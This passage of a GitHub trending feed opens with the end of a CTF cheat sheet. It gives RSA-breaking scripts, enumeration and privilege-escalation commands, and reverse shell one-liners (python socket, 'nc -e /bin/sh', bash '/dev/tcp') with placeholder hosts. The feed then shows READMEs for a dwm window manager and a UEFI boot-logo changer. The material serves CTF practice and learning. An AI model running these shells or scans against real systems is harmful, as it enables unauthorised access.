these)&#xA;print(key.p)&#xA;print(key.q)&#xA;print(key.n)&#xA;print(key.e)&#xA;print(key.d)&#xA;print(key.u)&#xA;&#xA;# public keys have n and e&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Chinese Remainder Theorem (p,q,e,c)&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Use this when you can factor the number &lt;code&gt;n&lt;/code&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Bad implementations will have more than one prime factor&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.di-mgt.com.au/crt_rsa.html&#34;&gt;Proof&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Old&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def egcd(a, b):&#xA;    if a == 0:&#xA;        return (b, 0, 1)&#xA;    g, y, x = egcd(b%a,a)&#xA;    return (g, x - (b//a) * y, y)&#xA;&#xA;def modinv(a, m):&#xA;    g, x, y = egcd(a, m)&#xA;    if g != 1:&#xA;        raise Exception(&#39;No modular inverse&#39;)&#xA;    return x%m&#xA;&#xA;p = &#xA;q = &#xA;e = &#xA;c = &#xA;&#xA;n = p*q # use factordb command or website to find factors&#xA;&#xA;phi = (p-1)*(q-1) # phi is simply the product of (factor_1-1) * ... * (factor_n -1)&#xA;&#xA;d = modinv(e, phi) # private key&#xA;&#xA;# print(d)&#xA;&#xA;m = pow(c,d,n) # decrypted plaintext message in long integer form&#xA;&#xA;thing = hex(m)[2:] # ascii without extra stuff at the start (0x)&#xA;print(bytes.fromhex(thing).decode(&#39;ascii&#39;))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;New&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/bin/python3&#xA;from Crypto.Util.number import *&#xA;from factordb.factordb import FactorDB&#xA;&#xA;# ints:&#xA;n =    &#xA;e =  &#xA;c =  &#xA;&#xA;f = FactorDB(n)&#xA;f.connect()&#xA;factors = f.get_factor_list()&#xA;&#xA;phi = 1&#xA;for i in factors:&#xA;&#x9;phi *= (i-1)&#xA;&#xA;d = inverse(e, phi)&#xA;m = pow(c, d, n)&#xA;&#xA;flag = long_to_bytes(m).decode(&#39;UTF-8&#39;)&#xA;print(flag)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Website that gives factors and euler&#39;s totient (phi)&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.alpertron.com.ar/ECM.HTM&#34;&gt;https://www.alpertron.com.ar/ECM.HTM&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Coppersmith attack (c,e)&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Usually used if the exponent is very small (e &amp;lt;= 5) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://web.eecs.umich.edu/~cpeikert/lic13/lec04.pdf&#34;&gt;Proof&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python3&#34;&gt;from Crypto.Util.number import *&#xA;def nth_root(radicand, index):&#xA;    lo = 1&#xA;    hi = radicand&#xA;    while hi - lo &amp;gt; 1:&#xA;        mid = (lo + hi) // 2&#xA;        if mid ** index &amp;gt; radicand:&#xA;            hi = mid&#xA;        else:&#xA;            lo = mid&#xA;&#xA;    if lo ** index == radicand:&#xA;        return lo&#xA;    elif hi ** index == radicand:&#xA;        return hi&#xA;    else:&#xA;        return -1&#xA;&#xA;c = &#xA;e = &#xA;&#xA;plaintext = long_to_bytes(nth_root(c, e))&#xA;print(plaintext.decode(&#34;UTF-8&#34;))&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Pollards attack (n,e,c)&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Based on &lt;a href=&#34;http://www.math.columbia.edu/~goldfeld/PollardAttack.pdf&#34;&gt;Pollard&#39;s factorization method&lt;/a&gt;, which makes products of primes &lt;a href=&#34;https://people.csail.mit.edu/rivest/pubs/RS01.version-1999-11-22.pdf&#34;&gt;easy to factor&lt;/a&gt; if they are (B)smooth &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This is the case if &lt;code&gt;p-1 | B!&lt;/code&gt; and &lt;code&gt;q - 1&lt;/code&gt; has a factor &amp;gt; &lt;code&gt;B&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python3&#34;&gt;from Crypto.Util.number import *&#xA;from math import gcd&#xA;&#xA;n = &#xA;c = &#xA;e = &#xA;&#xA;def pollard(n):&#xA;    a = 2&#xA;    b = 2&#xA;    while True:&#xA;        a = pow(a,b,n)&#xA;        d = gcd(a-1,n)&#xA;        if 1 &amp;lt; d &amp;lt; n: &#xA;            return d&#xA;        b += 1&#xA;&#xA;p = pollard(n)&#xA;q = n // p&#xA;&#xA;phi = 1&#xA;for i in [p,q]:&#xA;    phi *= (i-1)&#xA;&#xA;d = inverse(e, phi)&#xA;m = pow(c, d, n)&#xA;&#xA;flag = long_to_bytes(m).decode(&#39;UTF-8&#39;)&#xA;print(flag)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Wiener Attack (n,e,c)&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For use when d is too small (or e is too big) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Using &lt;a href=&#34;https://github.com/orisano/owiener&#34;&gt;this&lt;/a&gt; python module&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://sagi.io/crypto-classics-wieners-rsa-attack/&#34;&gt;Proof&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python3&#34;&gt;from Crypto.Util.number import *&#xA;import owiener&#xA;&#xA;n = &#xA;e = &#xA;c = &#xA;&#xA;d = owiener.attack(e, n)&#xA;m = pow(c, d, n)&#xA;&#xA;flag = long_to_bytes(m)&#xA;print(flag)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Base16, 32, 36, 58, 64, 85, 91, 92&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/mufeedvh/basecrack&#34;&gt;https://github.com/mufeedvh/basecrack&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Box&lt;/h2&gt; &#xA;&lt;h3&gt;Connecting&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ssh &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;ssh &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;ssh &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; -i &amp;lt;private key file&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Mount SSH in as a file system locally: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;sshfs -p &amp;lt;port&amp;gt; &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt;: &amp;lt;mount_directory&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Known hosts &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;ssh-copy-id -i ~/.ssh/id_rsa.pub &amp;lt;user@host&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;netcat &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;nc &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Enumeration&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Machine discovery&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;netdiscover&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Machine port scanning&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;nmap -sC -sV &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Linux enumeration&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;enum4linux &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SMB enumeration&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;smbmap -H &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Connect to SMB share&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;smbclient //&amp;lt;ip&amp;gt;/&amp;lt;share&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Privilege escalation&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&#34;&gt;linpeas&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;./linpeas.sh&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Automatically looks for privilege escalation vectors&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;List commands we can run as root &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Find files with the SUID permission &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;These files execute with the privileges of the owner instead of the user executing them&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Listen for reverse shell&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;nc -lnvp &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Reverse shell&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;revshells.com &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;templates for basically everything you might need&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&amp;lt;ip&amp;gt;&#34;,&amp;lt;port&amp;gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;nc -e /bin/sh &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Get interactive shell&lt;/h3&gt; &#xA;&lt;h4&gt;Linux&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Run the following python command to make it partially interactive: &lt;code&gt;python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Exit the netcat session with &lt;code&gt;CTRL+Z&lt;/code&gt; and run &lt;code&gt;stty raw -echo&lt;/code&gt; locally&lt;/li&gt; &#xA; &lt;li&gt;Reenter your session with the command &lt;code&gt;fg&lt;/code&gt; (and the job id afterward if needed)&lt;/li&gt; &#xA; &lt;li&gt;Change your terminal emulator to xterm by running &lt;code&gt;export TERM=xterm&lt;/code&gt; (this might not be necessary)&lt;/li&gt; &#xA; &lt;li&gt;Change your shell to bash by running &lt;code&gt;export SHELL=bash&lt;/code&gt; (this might not be necessary)&lt;/li&gt; &#xA; &lt;li&gt;Done! Now your shell should be fully interactive&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;Windows / General&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Install &lt;code&gt;rlwrap&lt;/code&gt; on your system&lt;/li&gt; &#xA; &lt;li&gt;Now, every time you run a nc listener, just put &lt;code&gt;rlwrap&lt;/code&gt; in front&lt;/li&gt; &#xA; &lt;li&gt;For example: &lt;code&gt;rlwrap nc -lvnp 1337&lt;/code&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This will give you arrow keys and command history, but won&#39;t give autocompletion (as far as I can tell) for windows and *nix systems&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;OSINT&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pimeyes.com/en&#34;&gt;pimeyes&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Reverse search faces on the internet&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://osintframework.com/&#34;&gt;OSINT Framework&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Website that aggregates tons of OSINT tools.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Misc&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Resolving DNS Errors&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;dig &amp;lt;site&amp;gt; &amp;lt;recordType&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_DNS_record_types&#34;&gt;List of record types&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Make sure you try TXT&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Run a binary as a different architecture&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;64 bit: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;linux64 ./&amp;lt;binary&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;32 bit: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;linux32 ./&amp;lt;binary&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Extract MS Macros:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php&#34;&gt;https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;View CNC GCode&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://ncviewer.com/&#34;&gt;https://ncviewer.com/&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Notes&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;TOC generated with &lt;a href=&#34;https://github.com/jonschlinkert/markdown-toc&#34;&gt;ecotrust-canada&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>yaocccc/dwm</title>
    <updated>2023-02-06T01:30:56Z</updated>
    <id>tag:github.com,2023-02-06:/yaocccc/dwm</id>
    <link href="https://github.com/yaocccc/dwm" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;DWM YES&lt;/h1&gt; &#xA;&lt;p&gt;dwm 是一个非常快速, 小巧并使用动态管理窗口的窗口管理器&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.bilibili.com/video/BV1Ef4y1Z7kA/&#34;&gt;展示视频: BV1Ef4y1Z7kA&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;功能&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;支持布局 tile(磁块)、magicgrid(进阶的网格布局)&lt;/li&gt; &#xA; &lt;li&gt;键盘移动/调整窗口大小 且移动/调整时有窗口间吸附效果&lt;/li&gt; &#xA; &lt;li&gt;窗口隐藏&lt;/li&gt; &#xA; &lt;li&gt;窗口可自定义是否全局(在所有tag内展示)&lt;/li&gt; &#xA; &lt;li&gt;更好的浮动窗口支持&lt;/li&gt; &#xA; &lt;li&gt;优化后的status2d 状态栏，可用鼠标点击操作&lt;/li&gt; &#xA; &lt;li&gt;系统托盘支持&lt;/li&gt; &#xA; &lt;li&gt;overview&lt;/li&gt; &#xA; &lt;li&gt;mod + tab, 在窗口间切换 有浮动窗口时仅在浮动窗口切换&lt;/li&gt; &#xA; &lt;li&gt;mod + [tag], 切换tag到指定目录时 可指定一个cmd，若目标tag无窗口 则执行该tag&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;安装&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;  !!!首次使用 请 cp -r DEF/* .&#xA;&#xA;  每次修改源代码后都需要执行&#xA;  sudo make clean install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;运行 dwm&lt;/h2&gt; &#xA;&lt;p&gt;将你的dwm源代码目录写入 ~/.profile, 例如&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;export DWM=~/workspace/dwm&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;将以下行添加到 .xinitrc 中来通过 &lt;code&gt;startx&lt;/code&gt; 启动 dwm:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;exec dwm&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;!!!关于fork配置!!!&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;  本仓库默认集成了 `DEF/` 目录，该目录为作者本人使用的配置&#xA;  DEF: 推荐配置 亦是 作者本人使用的配置&#xA;&#xA;  首次运行 可自行 `cp -r DEF/* .`&#xA;&#xA;  后续请用户自行维护 ./config.h ./statusbar ./autostart.sh 文件&#xA;  且此部分文件已被 gitignore&#xA;&#xA;  即用户可始终保持yaocccc/dwm仓库代码最新版而不受影响&#xA;&#xA;  较推荐的fork方式&#xA;&#xA;  1. fork本代码仓库&#xA;  2. 自行维护fork后的仓库相关的配置文件: ./config.h ./statusbar ./autostart.sh&#xA;  3. 注释掉fork后仓库中 .gitignore 的前三行&#xA;  4. 定期在github页面sync yaocccc/dwm 仓库保持最新&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Nix Flake&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;nix run github:yaocccc/dwm&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;状态栏&lt;/h2&gt; &#xA;&lt;p&gt;请将每一个块置为下列样式, 可直接使用本仓库statusbar相关脚本 或参考使用&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;  ^sdate^^c#2D1B46^^b#335566^  11/04 00:42 ^d^&#xA;&#xA;  ^s?????^ =&amp;gt; 点击时的信号值&#xA;  ^c?????^ =&amp;gt; 前景色&#xA;  ^b?????^ =&amp;gt; 背景色&#xA;  ^d^      =&amp;gt; 重置颜色&#xA;&#xA;  也可以直接从^c ^b 定义前景色 后景色透明度&#xA;  ^c#??????0xff^ =&amp;gt; 0xff 前景色透明度&#xA;  ^b#??????0x11^ =&amp;gt; 0x11 后景色透明度&#xA;&#xA;  本仓库维护了 statusbar脚本 入口为 ./statusbar/statusbar.sh&#xA;  &#xA;  模块列表见 ./statusbar/packages&#xA;  &#xA;  若需要使用 请逐个去查看 修改packages中的脚本文件&#xA;  &#xA;  请在dwm启动时 调用 $DWM/statusbar/statusbar.sh cron&#xA;&#xA;  注意 ~/.profile中需要有 该环境变量为强依赖关系&#xA;  export DWM=~/workspace/dwm&#xA;&#xA;  点击事件发生时 会调用 $DWM/statusbar/statusbar.sh 并传入信号值 请自行处理&#xA;  例如 $DWM/statusbar/statusbar.sh date L  # 其中date为信号值 L为按键 (L左键 M中键 R右键)&#xA;&#xA;  可执行 $DWM/statusbar/statusbar.sh check 检查是否有模块存在问题&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;随DWM启动的自启动命令&lt;/h2&gt; &#xA;&lt;p&gt;dwm启动时会去调用 $DWM/autostart.sh 脚本&lt;/p&gt; &#xA;&lt;p&gt;可参考 &lt;a href=&#34;https://github.com/yaocccc/dwm/raw/master/autostart.sh&#34;&gt;autostart脚本&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Q &amp;amp; A&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;如何启动dwm？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;确保 ~/.xinitrc 中有 exec dwm。在tty中使用 startx 命令启动&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;进入后是黑屏啥都没&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;壁纸需要用类似feh的软件设置 &lt;code&gt;feh --randomize --bg-fill ~/pictures/*.png&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;打不开终端&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;务必先修改config.h中启动终端的快捷键，本项目的config.h是我自用的配置 你需要手动修改&lt;/p&gt; &#xA;&lt;p&gt;例如 可以修改以下部分(如果你用的终端是st的话)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;    /* spawn + SHCMD 执行对应命令 */&#xA;    { MODKEY,              XK_Return,       spawn,            SHCMD(&#34;st&#34;) },&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;字体显示不全&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;请自行安装字体 仅以archlinux举例&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;yay -S nerd-fonts-jetbrains-mono&#xA;yay -S ttf-material-design-icons&#xA;yay -S ttf-joypixels&#xA;yay -S wqy-microhei&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;贡献者 THX&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yaocccc&#34;&gt;yaocccc&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/p3psi-boo&#34;&gt;p3psi-boo&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/yaocccc/dwm/pull/4&#34;&gt;PR#4 添加 Nix Flake 支持&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/gxt-kt&#34;&gt;gxt-kt&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/yaocccc/dwm/pull/7&#34;&gt;PR#7 修复hide/show窗口栈索引带来的无法恢复窗口的bug&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;ENJOY IT 😃&lt;/h2&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;a href=&#34;https://www.buymeacoffee.com/yaocccc&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://github.com/yaocccc/yaocccc/raw/master/qr.png&#34;&gt; &lt;/a&gt; &#xA;&lt;br&gt; &#xA;&lt;a href=&#34;https://www.buymeacoffee.com/yaocccc&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://cdn.buymeacoffee.com/buttons/v2/default-violet.png&#34; alt=&#34;Buy Me A Coffee&#34; style=&#34;height: 60px !important;width: 200px !important;&#34;&gt; &lt;/a&gt;</summary>
  </entry>
  <entry>
    <title>Metabolix/HackBGRT</title>
    <updated>2023-02-06T01:30:56Z</updated>
    <id>tag:github.com,2023-02-06:/Metabolix/HackBGRT</id>
    <link href="https://github.com/Metabolix/HackBGRT" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Windows boot logo changer for UEFI systems&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;HackBGRT&lt;/h1&gt; &#xA;&lt;p&gt;HackBGRT is intended as a boot logo changer for UEFI-based Windows systems.&lt;/p&gt; &#xA;&lt;h2&gt;Summary&lt;/h2&gt; &#xA;&lt;p&gt;When booting on a UEFI-based computer, Windows may show a vendor-defined logo which is stored on the UEFI firmware in a section called Boot Graphics Resource Table (BGRT). It&#39;s usually very difficult to change the image permanently, but a custom UEFI application may be used to overwrite it during the boot. HackBGRT does exactly that.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; If you mess up the installation, your system may become unbootable! Create a rescue disk before use. This software comes with no warranty. Use at your own risk.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Make sure that your computer is booting with UEFI.&lt;/li&gt; &#xA; &lt;li&gt;Make sure that Secure Boot is disabled, unless you know how to sign EFI applications.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Windows installation&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Get the latest release from the Releases page.&lt;/li&gt; &#xA; &lt;li&gt;Start &lt;code&gt;setup.exe&lt;/code&gt; and follow the instructions. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;You may need to manually disable Secure Boot and then retry.&lt;/li&gt; &#xA;   &lt;li&gt;The installer will launch Notepad for modifying the configuration. &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;If you need only one custom image, the defaults are fine.&lt;/li&gt; &#xA;     &lt;li&gt;Otherwise, check out the examples in the configuration file.&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;The installer will launch Paint for creating the image(s). &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;You can create multiple images by using Save As.&lt;/li&gt; &#xA;     &lt;li&gt;Be sure to always use the 24-bit BMP/DIB format.&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;If Windows later restores the original boot loader, just reinstall.&lt;/li&gt; &#xA;   &lt;li&gt;If you wish to change the image or other configuration, just reinstall.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Multi-boot configurations&lt;/h3&gt; &#xA;&lt;p&gt;If you only need HackBGRT for Windows:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Extract the latest release to &lt;code&gt;[EFI System Partition]\EFI\HackBGRT\&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Set 